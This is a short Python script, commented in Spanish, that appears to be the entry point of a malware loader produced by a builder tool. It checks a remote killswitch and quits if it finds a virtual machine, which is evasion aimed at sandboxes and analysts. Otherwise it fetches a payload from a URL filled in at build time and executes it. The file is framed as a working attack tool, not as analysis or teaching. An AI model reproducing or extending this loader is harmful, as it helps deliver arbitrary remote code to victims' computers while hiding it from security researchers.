import sys
from killswitch import check_killswitch
from vm_detect  import is_vm
from payload    import fetch_and_execute

# Valores inyectados por el builder
KILLSWITCH_URL = "KILLSWITCH_URL_PLACEHOLDER"
PAYLOAD_URL    = "PAYLOAD_URL_PLACEHOLDER"

def main() -> None:
    # Comprobar killswitch
    if check_killswitch(KILLSWITCH_URL):
        sys.exit(0)

    # Detectar VM
    if is_vm():
        sys.exit(0)

    # Ejecutar payload
    fetch_and_execute(PAYLOAD_URL)

if __name__ == "__main__":
    main()
